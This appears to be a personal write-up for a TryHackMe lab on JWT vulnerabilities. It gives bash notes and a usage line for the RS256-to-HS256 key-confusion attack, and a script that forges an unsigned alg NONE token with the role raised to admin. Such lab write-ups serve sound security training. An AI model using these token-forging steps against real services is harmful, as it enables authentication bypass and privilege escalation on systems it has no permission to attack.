# ZTH

[tryhackme room](https://tryhackme.com/room/zthobscurewebvulns)

## Section 3 JWT exploitation via HS256 and public key

Following [PayloadsAllTheThings JWT signature RS256 to HS256](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token#jwt-signature---rs256-to-hs256)

```bash
# USAGE:
# ./zth-jwt.bash public-key.pem JWT
# Example
# ./zth-jwt.bash jwt-auth-server-public-key.pem eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjE2MzQ0NDAyLCJleHAiOjE2MTYzNDQ1MjIsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ.Puej1hnMVYNgXiUvqienWlQ9L2G4rsJSt0--HUS-kg_FJ
```

## Section 4 JWT alg None

```bash
JWT=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjE2MzQ3MDM1NDQ0LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NjguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC82OC4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2MTYzNDcwMzV9.m7vtO7ioXzrvwanoTug5YlXUz0Y77UdWwocvGDFDDSM

JWT_HEADER=$(cut -d'.' -f1 <<<"$JWT")
JWT_PAYLOAD=$(cut -d'.' -f2 <<<"$JWT")
echo decoded header:
CLEARTEXT_HEADER=$(echo "$JWT_HEADER" | base64 -d)
echo $CLEARTEXT_HEADER

CLEARTEXT_PAYLOAD=$(echo "$JWT_PAYLOAD" | base64 -d)
echo decoded payloaded:
echo $CLEARTEXT_PAYLOAD
```

eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0=.eyJhdXRoIjoxNjE2MzQ3MDM1NDQ0LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NjguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC82OC4wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjE2MzQ3MDM1fX0=.

After some inspection, we can manually adjust the header's `alg` and the payload's `role`.

```bash
ADMIN_PAYLOAD='{"auth":1616347035444,"agent":"Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0","role":"admin","iat":1616347035}}'

JWT_HEADER_WITH_NONE=$(echo -n '{"typ":"JWT","alg":"NONE"}' | base64)
JWT_PAYLOAD_AS_ADMIN=$(echo -n $ADMIN_PAYLOAD | base64)
# Note the final dot. we leave out the signature for alg NONE
BAD_PAYLOAD_AS_ADMIN=$(echo -n ${JWT_HEADER_WITH_NONE}.${JWT_PAYLOAD_AS_ADMIN}.)
echo $BAD_PAYLOAD_AS_ADMIN
echo $BAD_PAYLOAD_AS_ADMIN | xclip -selection clipboard # directly copy to clipboard
```
